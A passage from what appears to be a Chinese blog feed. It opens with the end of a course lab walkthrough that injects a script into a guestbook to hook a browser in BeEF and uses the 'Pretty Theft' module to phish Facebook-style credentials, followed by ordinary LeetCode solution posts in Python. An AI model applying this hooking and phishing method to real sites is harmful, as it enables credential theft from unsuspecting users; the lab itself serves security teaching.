<p>原因是这个输入框的width有点短，让我们修改一下这个页面的html代码，将这个输入框的长度变长一些。</p>
<p>按下F12，查看源码。</p>
<p><img src="/2019/09/18/hacker-4/11.png" alt="11.png"></p>
<p>让我们点击下面出现的这个框框的最左边的按钮，它可以让你点击原先页面的位置，以便与快速定位html元素。</p>
<p><img src="/2019/09/18/hacker-4/12.png" alt="12.png"></p>
<p>点击之后会发现，有一行html代码高亮显示，让我们右击编辑它，将maxlength字段值改为1000，如下所示：</p>
<p><img src="/2019/09/18/hacker-4/13.png" alt="13.png"></p>
<p>改完之后可以关掉这个框框了。</p>
<p>你会发现原先Message中的内容不见，让我们重新粘贴一下复制的那行代码：</p>
<p><img src="/2019/09/18/hacker-4/14.png" alt="14.png"></p>
<p>啊！现在终于能复制全了，那就让我们点击下面的Sign Guestbook提交吧！</p>
<p>是不是像下面这样显示呢？</p>
<p><img src="/2019/09/18/hacker-4/15.png" alt="15.png"></p>
<p>看它成功返回了hello这个结果。现在让我们回到之前beef那个页面，去看看那里有什么改变。</p>
<p><img src="/2019/09/18/hacker-4/16.png" alt="16.png"></p>
<p>你会发现在左边的Online Browsers文件夹中出现了一台主机，</p>
<p>让我们点击它，出现下面这个页面：</p>
<p><img src="/2019/09/18/hacker-4/17.png" alt="17.png"></p>
<p>点击Commands，让我去社会工程学栏中寻找一个叫做Pretty Theft的脚本文件，如下所示：</p>
<p><img src="/2019/09/18/hacker-4/18.png" alt="18.png"></p>
<p>现在我们可以点击右下角的Execute了。</p>
<p>让我们回到另一个打开的页面，你会发现弹出了一个类似于facebook的弹窗，如下显示：</p>
<p><img src="/2019/09/18/hacker-4/19.png" alt="19.png"></p>
<p>当我们在里面输入Email和密码之后点击log in，你所输入的信息就会到beef的后台数据库中。</p>
<p>回到beef页面，你会在数据库中看到如下信息：</p>
<p><img src="/2019/09/18/hacker-4/20.png" alt="20.png"></p>
<p>到这里这个实验就结束了！</p>
]]></content>
      <categories>
        <category>软件综合训练课程</category>
      </categories>
  </entry>
  <entry>
    <title>LeetCode DAY 1 (1-3)</title>
    <url>/2019/11/13/leetcode-day1/</url>
    <content><![CDATA[<p>LeetCode系列 争取每日更新3题 —— 一个为了有工作的fw会坚持下去的！<a id="more"></a><br>（自从昨天尝试着做了几道leetcode才发现我的代码能力<del>几乎</del>等于0…照这样下去我怕是要找不到工作了…因此从现在开始每天督促自己刷3道leetcode…并且第二天将前一天的解题过程上传到这里就当作是巩固复习吧…）</p>
<h3 id="1-两数之和（简单）"><a href="#1-两数之和（简单）" class="headerlink" title="1. 两数之和（简单）"></a>1. 两数之和（简单）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标。你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">给定 nums = [2, 7, 11, 15], target = 9</span><br><span class="line"></span><br><span class="line">因为 nums[0] + nums[1] = 2 + 7 = 9</span><br><span class="line">所以返回 [0, 1]</span><br></pre></td></tr></table></figure></p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>刚开始看到这道题的时候觉得很简单，<del>虽然题目本来就标的就是简单…..</del><br>于是一开始就这样胡乱一写…<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">twoSum</span><span class="hljs-params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(nums)):</span><br><span class="line">            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(i+<span class="hljs-number">1</span>, len(nums)):</span><br><span class="line">                <span class="hljs-keyword">if</span> nums[i]+nums[j]==target:</span><br><span class="line">                    <span class="hljs-keyword">return</span> [i, j]</span><br></pre></td></tr></table></figure><br>这样写虽然可以做到题目要求，但是时间复杂度太高了$O(n^{2})$，因此提交的时候有时候可以通过，有时候就是时间超过限制，看了评论区各位大佬的提示，讲到可以利用哈希表查找以空间换取时间的做法降低时间复杂度。于是改写代码如下：<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">twoSum</span><span class="hljs-params">(self, nums, target)</span>:</span></span><br><span class="line">        dict1 = &#123;&#125;</span><br><span class="line">        <span class="hljs-keyword">if</span> len(nums)&lt;<span class="hljs-number">2</span>:</span><br><span class="line">        	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(nums)):</span><br><span class="line">            num = target - nums[i]</span><br><span class="line">            <span class="hljs-keyword">if</span> num <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> dict1:</span><br><span class="line">                dict1[nums[i]] = i</span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                <span class="hljs-keyword">return</span>[dict1[num],i]</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span></span><br></pre></td></tr></table></figure><br>在python里，字典就对应着哈希查找表，于是我们相当于多定义了一个字典，最开始字典为空，按<code>nums</code>数组中的顺序取数，首先计算这个数字需要与什么数字相加才能等于<code>target</code>，然后就去字典里查找有没有这个数字，如果没有，那就将当前读的数字添加到字典中，key为数字的值，value为标号，所以最后总会在字典中查找到答案，这样时间复杂度就降低到了$O(n)$<br>第一题就到这里吧，其实DS里的哈希表我也忘记了，emmmm正好趁现在去复习下吧!</p>
<hr>
<h3 id="2-两数相加（中等）"><a href="#2-两数相加（中等）" class="headerlink" title="2. 两数相加（中等）"></a>2. 两数相加（中等）</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>给出两个非空的链表用来表示两个非负的整数。其中，它们各自的位数是按照逆序的方式存储的，并且它们的每个节点只能存储一位数字。<br>如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。<br>您可以假设除了数字0之外，这两个数都不会以0开头。</p>
<h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">输出：7 -&gt; 0 -&gt; 8</span><br><span class="line">原因：342 + 465 = 807</span><br></pre></td></tr></table></figure></p>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><p>这道题明显是提醒我去复习链表操作了，而且最重要的是我好像从来没有在python中使用过链表…没办法只能硬着头皮瞎jb敲了，最开始还是失败了，原因有两个：1.因为要返回结果所以要留一个头指针 2.next指针要熟练。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="hljs-comment"># class ListNode:</span></span><br><span class="line"><span class="hljs-comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="hljs-comment">#         self.val = x</span></span><br><span class="line"><span class="hljs-comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addTwoNumbers</span><span class="hljs-params">(self, l1, l2)</span>:</span></span><br><span class="line">        head = ListNode(<span class="hljs-number">0</span>) <span class="hljs-comment">#定义头指针用来返回结果</span></span><br><span class="line">        l3 = head <span class="hljs-comment">#l3用来进行链表操作</span></span><br><span class="line">        count = <span class="hljs-number">0</span> <span class="hljs-comment">#判断是否有进位</span></span><br><span class="line">        <span class="hljs-keyword">while</span>(l1 <span class="hljs-keyword">or</span> l2): </span><br><span class="line">            x = l1.val <span class="hljs-keyword">if</span> l1 <span class="hljs-keyword">else</span> <span class="hljs-number">0</span></span><br><span class="line">            y = l2.val <span class="hljs-keyword">if</span> l2 <span class="hljs-keyword">else</span> <span class="hljs-number">0</span></span><br><span class="line">            l3.next = ListNode((x+y+count)%<span class="hljs-number">10</span>) <span class="hljs-comment">#从个位数开始计算</span></span><br><span class="line">            l3 = l3.next <span class="hljs-comment">#指针移动</span></span><br><span class="line">            count = (x+y+count)//<span class="hljs-number">10</span> <span class="hljs-comment">#注意python中的整除有两个//</span></span><br><span class="line">            <span class="hljs-keyword">if</span>(l1!=<span class="hljs-literal">None</span>):</span><br><span class="line">                l1 = l1.next</span><br><span class="line">            <span class="hljs-keyword">if</span>(l2!=<span class="hljs-literal">None</span>):</span><br><span class="line">                l2 = l2.next</span><br><span class="line">        <span class="hljs-keyword">if</span>(count == <span class="hljs-number">1</span>): <span class="hljs-comment">#如果最后还有有进位</span></span><br><span class="line">            l3.next = ListNode(<span class="hljs-number">1</span>)</span><br><span class="line">        <span class="hljs-keyword">return</span> head.next</span><br></pre></td></tr></table></figure><br>虽然这道题的难度标的是中等，但感觉只要链表操作熟练了，这道题还是蛮简单的。算了算了别忘了复习链表操作…一定不要忘了返回结果需要头指针哦…</p>
<hr>
<h3 id="3-无重复字符的最长子串（中等）"><a href="#3-无重复字符的最长子串（中等）" class="headerlink" title="3. 无重复字符的最长子串（中等）"></a>3. 无重复字符的最长子串（中等）</h3><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个字符串，请你找出其中不含有重复字符的最长子串的长度。</p>
<h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">输入: <span class="hljs-string">"abcabcbb"</span></span><br><span class="line">输出: 3 </span><br><span class="line">解释: 因为无重复字符的最长子串是 <span class="hljs-string">"abc"</span>，所以其长度为 3。</span><br></pre></td></tr></table></figure></p>
<h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">输入: <span class="hljs-string">"bbbbb"</span></span><br><span class="line">输出: 1</span><br><span class="line">解释: 因为无重复字符的最长子串是 <span class="hljs-string">"b"</span>，所以其长度为 1。</span><br></pre></td></tr></table></figure></p>
<h5 id="示例3"><a href="#示例3" class="headerlink" title="示例3"></a>示例3</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">输入: <span class="hljs-string">"pwwkew"</span></span><br><span class="line">输出: 3</span><br><span class="line">解释: 因为无重复字符的最长子串是 <span class="hljs-string">"wke"</span>，所以其长度为 3。</span><br><span class="line">     请注意，你的答案必须是 子串 的长度，<span class="hljs-string">"pwke"</span> 是一个子序列，不是子串。</span><br></pre></td></tr></table></figure></p>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><p>刚看完题目描述的我觉得这道题目好像很简单啊，用第一题时候一样的字典查找就可以解决了，最后题目给的三个例子倒是通过了，提交检测的几百上千个测试用例却总有通不过的，为了涵盖不同的测试用例代码被我改的又臭又长，折腾了一段时间只好打开了百度放弃了挣扎…所以说到底我的代码能力是真滴弱啊…因此直接附上大佬们的代码吧…<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lengthOfLongestSubstring</span><span class="hljs-params">(self, s)</span>:</span></span><br><span class="line">        dict1 = &#123;&#125; <span class="hljs-comment">#定义一个字典用来查找</span></span><br><span class="line">        i , ans = <span class="hljs-number">0</span>, <span class="hljs-number">0</span> <span class="hljs-comment">#i代表重复的最后的位置，ans为结果</span></span><br><span class="line">        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(len(s)):</span><br><span class="line">            <span class="hljs-keyword">if</span> s[j] <span class="hljs-keyword">in</span> dict1:</span><br><span class="line">                i = max(dict1[s[j]],i) <span class="hljs-comment">#取重复的最后面的字符位置</span></span><br><span class="line">                <span class="hljs-comment">#i = dict1[s[j]]</span></span><br><span class="line">            ans = max(ans, j-i+<span class="hljs-number">1</span>) <span class="hljs-comment">#取最大的子序列长度</span></span><br><span class="line">            dict1[s[j]] = j+<span class="hljs-number">1</span> <span class="hljs-comment">#将不在字典中的也就是不重复的字母放入字典,同时保持位置更新，使用j+1是为了直接跳到重复字符的下一个位置。</span></span><br><span class="line">        <span class="hljs-keyword">return</span> ans</span><br></pre></td></tr></table></figure><br>最后反思一下自己为什么想不到为什么想不到……</p>
]]></content>
      <categories>
        <category>LeetCode系列</category>
      </categories>
  </entry>
  <entry>
    <title>LeetCode DAY 4 (6)</title>
    <url>/2020/01/13/leetcode-day4/</url>
    <content><![CDATA[<p>嘿！大家好，懒狗又要开始更新Leetcode咯！<a id="more"></a></p>
<h3 id="6-Z字形变换（中等）"><a href="#6-Z字形变换（中等）" class="headerlink" title="6. Z字形变换（中等）"></a>6. Z字形变换（中等）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>将一个给定字符串根据给定的行数，以从上往下、从左到右进行 Z 字形排列。<br>比如输入字符串为<code>&quot;LEETCODEISHIRING&quot;</code>行数为3时，排列如下：<br><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">L   C   I   R</span><br><span class="line">E T O E S I I G</span><br><span class="line">E   D   H   N</span><br></pre></td></tr></table></figure><br>之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：<code>&quot;LCIRETOESIIGEDHN&quot;</code>。<br>请你实现这个将字符串进行指定行数变换的函数：<br><code>string convert(string s, int numRows);</code></p>
<h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">输入: s = <span class="hljs-string">"LEETCODEISHIRING"</span>, numRows = 3</span><br><span class="line">输出: <span class="hljs-string">"LCIRETOESIIGEDHN"</span></span><br></pre></td></tr></table></figure></p>
<h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">输入: s = <span class="hljs-string">"LEETCODEISHIRING"</span>, numRows = 4</span><br><span class="line">输出: <span class="hljs-string">"LDREOEIIECIHNTSG"</span></span><br><span class="line">解释:</span><br><span class="line"></span><br><span class="line">L     D     R</span><br><span class="line">E   O E   I I</span><br><span class="line">E C   I H   N</span><br><span class="line">T     S     G</span><br></pre></td></tr></table></figure></p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：按行取值（就叫找规律吧…）"><a href="#解法1：按行取值（就叫找规律吧…）" class="headerlink" title="解法1：按行取值（就叫找规律吧…）"></a>解法1：按行取值（就叫找规律吧…）</h5><p>我们可以从这个Z字形（大哥这明明就是N字形啊）的排列上找出些规律，比如如果<code>numRows = 3</code>，那么第一行的两个元素相差的距离为4，也就是<code>d = 2*numRows-2</code>，最后一行亦如此，而从示例2我们可以看出，中间各行的元素间隔虽然不相等，但是只有两种分布，一种比第一行的<code>d</code>要少一部分，而这一部分就是<code>2*距离第一行的行数差</code>，那另一种元素间隔就是<code>d-刚刚那种元素间隔</code>，就这么简单？还真就这么被找规律找出来了hhh，我都想笑了。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">convert</span><span class="hljs-params">(self, s, numRows)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type s: str</span></span><br><span class="line"><span class="hljs-string">        :type numRows: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: str</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> numRows == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> numRows &gt;= len(s):</span><br><span class="line">            <span class="hljs-keyword">return</span> s</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            ans = []</span><br><span class="line">            i = <span class="hljs-number">0</span></span><br><span class="line">            n = <span class="hljs-number">2</span>*numRows<span class="hljs-number">-2</span></span><br><span class="line">            <span class="hljs-comment"># 第一行</span></span><br><span class="line">            <span class="hljs-keyword">while</span> i &lt; len(s):</span><br><span class="line">                ans.append(s[i])</span><br><span class="line">                i += n</span><br><span class="line">            <span class="hljs-comment"># 中间各行</span></span><br><span class="line">            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>,numRows):</span><br><span class="line">                n = n - <span class="hljs-number">2</span></span><br><span class="line">                <span class="hljs-keyword">while</span> i<span class="hljs-number">-1</span> &lt; len(s):</span><br><span class="line">                    ans.append(s[i<span class="hljs-number">-1</span>])</span><br><span class="line">                    i += n</span><br><span class="line">            <span class="hljs-comment"># 最后一行</span></span><br><span class="line">            n = <span class="hljs-number">2</span>*numRows<span class="hljs-number">-2</span></span><br><span class="line">            i = numRows<span class="hljs-number">-1</span></span><br><span class="line">            <span class="hljs-keyword">while</span> i &lt; len(s):</span><br><span class="line">                ans.append(s[i])</span><br><span class="line">                i += n</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join(ans)</span><br></pre></td></tr></table></figure><br>但是看完评论区另一种解法我气的够呛，卧槽我怎么能这么傻，害，这么明显的规律我都没发现…</p>
<h5 id="解法3：按列取值（我觉得更像顺藤摸瓜，嘻嘻嘻）"><a href="#解法3：按列取值（我觉得更像顺藤摸瓜，嘻嘻嘻）" class="headerlink" title="解法3：按列取值（我觉得更像顺藤摸瓜，嘻嘻嘻）"></a>解法3：按列取值（我觉得更像顺藤摸瓜，嘻嘻嘻）</h5><p>上一种方法是从<code>s</code>中按最终答案的顺序取值，那我们能不能换个思考方式，按照<code>s</code>的存储顺序取值呢。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">convert</span><span class="hljs-params">(self, s, numRows)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type s: str</span></span><br><span class="line"><span class="hljs-string">        :type numRows: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: str</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> numRows &gt;= len(s) <span class="hljs-keyword">or</span> numRows == <span class="hljs-number">1</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> s</span><br><span class="line">        ans, count, d = [<span class="hljs-string">''</span>]*numRows, <span class="hljs-number">0</span>, <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:</span><br><span class="line">            ans[count] += i</span><br><span class="line">            count += d</span><br><span class="line">            <span class="hljs-comment"># 当到第一行和最后一行的时候d需要反转</span></span><br><span class="line">            <span class="hljs-keyword">if</span> count==<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> count==numRows<span class="hljs-number">-1</span>:</span><br><span class="line">                d = -d</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join(ans)</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>LeetCode系列</category>
      </categories>
  </entry>
  <entry>
    <title>LeetCode DAY 5 (7-8)</title>
    <url>/2020/01/14/leetcode-day5/</url>
    <content><![CDATA[<p>虽然打了一下午的游戏，但懒狗不会忘记刷题的！<a id="more"></a></p>
<h3 id="7-整数反转（简单）"><a href="#7-整数反转（简单）" class="headerlink" title="7. 整数反转（简单）"></a>7. 整数反转（简单）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>给出一个32位的有符号整数，你需要将这个整数中每位上的数字进行反转。</p>
<h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: 123</span><br><span class="line">输出: 321</span><br></pre></td></tr></table></figure></p>
<h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: -123</span><br><span class="line">输出: -321</span><br></pre></td></tr></table></figure></p>
<h5 id="示例3"><a href="#示例3" class="headerlink" title="示例3:"></a>示例3:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: 120</span><br><span class="line">输出: 21</span><br></pre></td></tr></table></figure></p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：弹出和推入数字-amp-溢出前进行检查"><a href="#解法1：弹出和推入数字-amp-溢出前进行检查" class="headerlink" title="解法1：弹出和推入数字 &amp; 溢出前进行检查"></a>解法1：弹出和推入数字 &amp; 溢出前进行检查</h5><p>取出一位数字很显然用到<code>%</code>，之后需要用<code>//</code>将取出的一位数字从原数值中删去。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse</span><span class="hljs-params">(self, x)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type x: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: int</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        y, ans = abs(x), <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-comment"># 边界</span></span><br><span class="line">        boundry = (<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>) <span class="hljs-keyword">if</span> x&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> (<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>) - <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">while</span> y!=<span class="hljs-number">0</span>:</span><br><span class="line">            ans = ans*<span class="hljs-number">10</span> + y%<span class="hljs-number">10</span></span><br><span class="line">            <span class="hljs-keyword">if</span> ans &gt; boundry:</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span></span><br><span class="line">            y //= <span class="hljs-number">10</span></span><br><span class="line">        <span class="hljs-keyword">return</span> ans <span class="hljs-keyword">if</span> x&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> -ans</span><br></pre></td></tr></table></figure><br>另外利用移位可以很容易表示一个很大的边界值。</p>
<h5 id="解法2-转化为字符串"><a href="#解法2-转化为字符串" class="headerlink" title="解法2: 转化为字符串"></a>解法2: 转化为字符串</h5><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse</span><span class="hljs-params">(self, x)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type x: int</span></span><br><span class="line"><span class="hljs-string">        :rtype: int</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-number">-10</span>&lt;x&lt;<span class="hljs-number">10</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> x</span><br><span class="line">        str_x = str(x)</span><br><span class="line">        boundry = <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span> <span class="hljs-keyword">if</span> x&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> (<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)<span class="hljs-number">-1</span></span><br><span class="line">        <span class="hljs-keyword">if</span> x&gt;<span class="hljs-number">0</span>:</span><br><span class="line">            temp = str_x[::<span class="hljs-number">-1</span>]</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            temp = str_x[:<span class="hljs-number">0</span>:<span class="hljs-number">-1</span>]</span><br><span class="line">        ans = int(temp)</span><br><span class="line">        <span class="hljs-keyword">if</span> ans&gt;boundry:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> ans <span class="hljs-keyword">if</span> x&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> -ans</span><br></pre></td></tr></table></figure><br>在这里再次提醒自己熟悉一下python字符串的切片功能。</p>
<hr>
<h3 id="8-字符串转换整数-atoi-（中等）"><a href="#8-字符串转换整数-atoi-（中等）" class="headerlink" title="8. 字符串转换整数(atoi)（中等）"></a>8. 字符串转换整数(atoi)（中等）</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>请你来实现一个 atoi 函数，使其能将字符串转换成整数。<br>首先，该函数会根据需要丢弃无用的开头空格字符，直到寻找到第一个非空格的字符为止。<br>当我们寻找到的第一个非空字符为正或者负号时，则将该符号与之后面尽可能多的连续数字组合起来，作为该整数的正负号；假如第一个非空字符是数字，则直接将其与之后连续的数字字符组合起来，形成整数。<br>该字符串除了有效的整数部分之后也可能会存在多余的字符，这些字符可以被忽略，它们对于函数不应该造成影响。<br>注意：假如该字符串中的第一个非空格字符不是一个有效整数字符、字符串为空或字符串仅包含空白字符时，则你的函数不需要进行转换。<br>在任何情况下，若函数不能进行有效的转换时，请返回0。</p>
<h5 id="示例1-1"><a href="#示例1-1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: &quot;42&quot;</span><br><span class="line">输出: 42</span><br></pre></td></tr></table></figure></p>
<h5 id="示例2-1"><a href="#示例2-1" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: &quot;   -42&quot;</span><br><span class="line">输出: -42</span><br><span class="line">解释: 第一个非空白字符为 &apos;-&apos;, 它是一个负号。</span><br><span class="line">     我们尽可能将负号与后面所有连续出现的数字组合起来，最后得到 -42 。</span><br></pre></td></tr></table></figure></p>
<h5 id="示例3-1"><a href="#示例3-1" class="headerlink" title="示例3:"></a>示例3:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: &quot;4193 with words&quot;</span><br><span class="line">输出: 4193</span><br><span class="line">解释: 转换截止于数字 &apos;3&apos; ，因为它的下一个字符不为数字。</span><br></pre></td></tr></table></figure></p>
<h5 id="示例4"><a href="#示例4" class="headerlink" title="示例4:"></a>示例4:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: &quot;words and 987&quot;</span><br><span class="line">输出: 0</span><br><span class="line">解释: 第一个非空字符是 &apos;w&apos;, 但它不是数字或正、负号。</span><br><span class="line">     因此无法执行有效的转换。</span><br></pre></td></tr></table></figure></p>
<h5 id="示例5"><a href="#示例5" class="headerlink" title="示例5:"></a>示例5:</h5><p><figure class="highlight plain hljs"><table><tr><td class="code"><pre><span class="line">输入: &quot;-91283472332&quot;</span><br><span class="line">输出: -2147483648</span><br><span class="line">解释: 数字 &quot;-91283472332&quot; 超过 32 位有符号整数范围。 </span><br><span class="line">     因此返回 INT_MIN (−231) 。</span><br></pre></td></tr></table></figure></p>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><p>这道题可以利用正则表达式，一行代码就可以解决。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">myAtoi</span><span class="hljs-params">(self, str)</span>:</span></span><br><span class="line">        <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">        :type str: str</span></span><br><span class="line"><span class="hljs-string">        :rtype: int</span></span><br><span class="line"><span class="hljs-string">        """</span></span><br><span class="line">        <span class="hljs-keyword">return</span> max(min(int(*re.findall(<span class="hljs-string">r'^[\+\-]?\d+'</span>, str.lstrip())), (<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)<span class="hljs-number">-1</span>), -(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>))</span><br></pre></td></tr></table></figure><br>这里需要注意的是，因为<code>re.findall()</code>返回的是个列表，因此调用<code>int()</code>方法转化为整数的时候需要前面加一个<code>*</code>。<br>这道题也提醒我该去好好看看正则表达式了…</p>
]]></content>
      <categories>
        <category>LeetCode系列</category>
      </categories>
  </entry>
  <entry>
    <title>LeetCode DAY 6 (9-10)</title>
    <url>/2020/01/15/leetcode-day6/</url>
